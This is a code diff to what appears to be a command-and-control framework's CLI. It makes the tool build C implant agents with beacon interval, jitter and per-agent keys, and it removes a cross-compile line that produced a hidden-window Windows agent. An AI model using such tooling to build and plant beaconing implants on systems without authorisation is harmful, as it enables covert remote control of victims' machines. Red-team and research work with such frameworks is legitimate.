@@ -889,10 +889,17 @@ class SockPuppetsCLI(cmd.Cmd):
             except Exception as e:
                 results['powershell'] = f"Error: {e}"
 
-        if lang == 'c':
-            print(f"\n[*] C agent: use agent_c/agent.c with MinGW cross-compiler")
-            print(f"    x86_64-w64-mingw32-gcc -o agent.exe agent_c/agent.c -lwinhttp -s -Os -mwindows")
-            results['c'] = 'See agent_c/agent.c'
+        if lang in ('c', 'all'):
+            try:
+                c_path = generator.generate_c_agent(
+                    host, port, key, transport=transport,
+                    beacon_interval=interval, beacon_jitter=jitter,
+                    unique_key=unique_keys
+                )
+                results['c'] = c_path
+            except Exception as e:
+                results['c'] = f"Error: {str(e)}"
+                print(f"[-] C agent failed: {str(e)}")
 
         # Register all generated per-agent keys with the server
         generated_keys = getattr(generator, 'generated_keys', [])
